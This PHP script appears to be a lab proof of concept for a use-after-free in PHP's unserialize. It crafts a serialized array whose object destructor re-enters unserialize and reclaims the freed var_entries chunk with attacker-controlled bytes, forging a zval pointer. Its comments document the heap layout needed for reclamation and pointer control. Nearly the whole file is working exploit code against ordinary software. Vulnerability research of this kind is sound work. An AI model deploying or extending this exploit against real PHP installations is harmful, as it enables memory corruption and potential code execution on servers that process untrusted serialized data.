<?php
/* var_destroy re-entry UAF — reclaim/control probe (lab-only).
 *
 * The freed object is the var_entries extension chunk:
 *   struct { zend_long used_slots; void *next; zval *data[1018]; }  // 8160 B
 * In __destruct we allocate a same-size zend_string; if malloc/ZendMM reuses
 * the freed chunk, the stale bookkeeping is our bytes:
 *   used_slots = zend_string header (refcount/type) -- large, so bounds pass
 *   data[1]    = first 8 bytes of the string data (a zval* the inner R:1
 *                dereferences)
 * argv[1] = padding length (default 8135 -> 8160 B allocation).
 */
$len = (int)($argv[1] ?? 8135);
$GLOBALS['LEN'] = $len;

class T {
    public function __destruct() {
        $n = $GLOBALS['LEN'];
        // First 8 bytes become data[1] (a zval*); make it a recognisable
        // wild pointer so reuse is observable. Rest is padding.
        $forge = str_repeat("\x41", $n);
        $forge = "\x41\x41\x41\x41\x41\x41\x41\x41" . substr($forge, 8);
        $r = @unserialize('R:1;');
        fwrite(STDERR, "reclaim n=$n result=" . gettype($r) . "\n");
        unset($forge);
    }
}

$N = 1016;
$p = 'a:' . ($N + 2) . ':{';
for ($i = 0; $i < $N; $i++) $p .= 'i:0;N;';
$p .= 'i:99999;O:1:"T":0:{}i:99999;i:42;}';
fwrite(STDERR, "len=$len outer=" . strlen($p) . "\n");
@unserialize($p);
fwrite(STDERR, "done\n");
